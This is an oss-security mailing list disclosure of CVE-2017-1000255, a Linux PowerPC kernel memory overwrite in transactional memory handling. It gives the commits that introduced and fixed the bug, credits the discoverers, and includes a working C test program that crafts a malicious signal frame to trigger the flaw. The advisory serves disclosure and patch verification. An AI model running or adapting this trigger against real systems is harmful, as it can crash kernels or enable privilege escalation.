X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3804" "Tuesday" "10" "October" "2017" "15:13:29" "+1100" "Michael Ellerman" "mpe@ellerman.id.au" "<87fuary712.fsf@concordia.ellerman.id.au>" "129" "[oss-security] CVE-2017-1000255: Linux: powerpc: kernel memory overwrite in transactional memory handling" nil nil nil "10" "2017101004:13:29" "[oss-security] CVE-2017-1000255: Linux: powerpc: kernel memory overwrite in transactional memory handling" (number mark "U       mpe@ellerman Oct 10  129/3804  " thread-indent "\"[oss-security] CVE-2017-1000255: Linux: powerpc: kernel memory overwrite in transactional memory handling\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 19622 invoked by uid 550); 10 Oct 2017 09:56:07 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 25756 invoked from network); 10 Oct 2017 04:14:16 -0000
From: Michael Ellerman <mpe@ellerman.id.au>
To: oss-security@lists.openwall.com <oss-security@lists.openwall.com>
Cc: cyrilbur@gmail.com <cyrilbur@gmail.com>, Gustavo Romero  <gromero@linux.vnet.ibm.com>, leitao@debian.org <leitao@debian.org>
Date: Tue, 10 Oct 2017 15:13:29 +1100
Message-ID: <87fuary712.fsf@concordia.ellerman.id.au>
MIME-Version: 1.0
Content-Type: multipart/signed; boundary="=-=-=";
	micalg=pgp-sha1; protocol="application/pgp-signature"
Subject: [oss-security] CVE-2017-1000255: Linux: powerpc: kernel memory overwrite in transactional memory handling

--=-=-=
Content-Type: text/plain

On Linux running on PowerPC hardware (Power8 or later) a user process can craft
a signal frame and then do a sigreturn so that the kernel will take an exception
(interrupt), and use the r1 value from the signal frame as the kernel stack
pointer. As part of the exception entry the content of the signal frame is
written to the kernel stack, allowing an attacker to overwrite arbitrary
locations with arbitrary values. The exception handling does produce an oops,
and a panic if panic_on_oops=1, but only after kernel memory has been over
written.

The bug was introduced in commit:

    5d176f751ee3 ("powerpc: tm: Enable transactional memory (TM) lazily for userspace")

Which was merged upstream into v4.9-rc1.

Kernels built with CONFIG_PPC_TRANSACTIONAL_MEM=n are not vulnerable.

The bug is fixed upstream in commit:

  265e60a170d0 ("powerpc/64s: Use emergency stack for kernel TM Bad Thing program checks")

  https://git.kernel.org/linus/265e60a170d0a0ecfc2d20490134ed2c48dd45ab

Which will appear in 4.14-rc5 when it is released.

A test case is available below.

This issue was discovered by Gustavo Romero, Breno Leitao, Paul Mackerras, Cyril
Bur and Michael Ellerman.

cheers


diff --git a/tm-bad-stack.c b/tm-bad-stack.c
new file mode 100644
index 000000000000..c2b4a25230cb
--- /dev/null
+++ b/tm-bad-stack.c
@@ -0,0 +1,65 @@
+/*
+ * Build with:
+ *   gcc -Wall -Werror -O2 -o tm-bad-stack tm-bad-stack.c
+ *
+ * Both patched and unpatched kernels will print an oops and kill the test case.
+ * However unpatched kernels will display a message about a bad kernel stack
+ * pointer, including the R1_VALUE defined below. eg. When the test case is
+ * built 64-bit:
+ *
+ *   Bad kernel stack pointer 5deaddeaddead000 at c00000000000becc
+ *
+ * A patched kernel should not have any "Bad kernel stack" messages, eg:
+ *
+ *  $ dmesg | grep -i "bad kernel stacK"
+ *
+ * Should return no matches.
+ *
+ * Copyright 2017, IBM Corp
+ * Licensed under GPLv2.
+ */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <signal.h>
+#include <unistd.h>
+
+
+#ifdef __powerpc64__
+#define regs(_ucp)	((_ucp)->uc_mcontext.gp_regs)
+#define R1_VALUE	0x5deaddeaddead000ul
+#else
+#define regs(_ucp)	((_ucp)->uc_mcontext.uc_regs->gregs)
+#define R1_VALUE	0x5deaddedul
+#endif
+
+void signal_usr1(int signum, siginfo_t *info, void *uc)
+{
+	ucontext_t *ucp = uc;
+
+	/* Link tm checkpointed context to normal context */
+	ucp->uc_link = ucp;
+
+	/* Clear MSR[TM] */
+	regs(ucp)[PT_MSR] &= ~(1ULL << 32);
+	/* Set MSR[TS] = 0b10 */
+	regs(ucp)[PT_MSR] |= (2ULL << 33);
+	regs(ucp)[PT_R1] = R1_VALUE;
+}
+
+int main(void)
+{
+	struct sigaction act;
+
+	act.sa_sigaction = signal_usr1;
+	sigemptyset(&act.sa_mask);
+	act.sa_flags = SA_SIGINFO;
+	if (sigaction(SIGUSR1, &act, NULL) < 0) {
+		perror("sigaction sigusr1");
+		exit(1);
+	}
+
+	raise(SIGUSR1);
+
+	return 0;
+}

--=-=-=
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJZ3EjqAAoJEFHr6jzI4aWAQZwP/1Y5SGh9jAj+Hlh25xjVxqhQ
FQnSma1pRad/vyIQjeFzdT9v3BiSVuO7XsB7I0FU2iWdIJPFV0S0cf1Bm/nflTF7
/9HPVB3II/FAIQ2lZpVIRexiVsQDUgR4IU6++lVOQB4CGS/TzRYb9a6Qodj581kr
YsN0nFuf7ndcjGgUlEyFbxGLXt4BesSeQEr3z0Z/oKIt1TyDCh3kEmZq4zL2l6GB
Kt/+W7VqvHeGzhx8WjI8V83f0oqCQDebouAeiOUONeO7o6ou/tsD4JJJlYyGdKEg
glZYiNWhTEiG/gj/pRuGO/1N6IrY8i+EmYE42Nca7WRTKgdzVMG8haFjiJsQG+Jr
ed5QDLhsSxuKezxILH/Ah6Qy3wVKNXRF31XqxuiWfwlvhIn9BU6QpIGguUNZpC54
3sahXIczw9+lLI9WW1d+w1ebCp/xyac5x/8W2eZcgbeEWUT1+AsItDUJhVFOgGb1
b33O5YuS6eqnKmsBbUdLYZia1MlO7MP1fMOh0nvw9VL9GeKxdkG0aqYpgJ6ZiyoI
TTBTzUDBHD7YOkxBqlDddEodT3CcLPCirN1HLYRYHbSQ45B0XomQMBE4S1zDaz9J
BE2l2d0OpT/YUjE5gGZOpkA/ZEbaj4/HV8x4cdxxPf96F+8xEmW2KFvbGGFBp9j7
9x+kaXcvYUdQQl0L9M7E
=5kKd
-----END PGP SIGNATURE-----
--=-=-=--
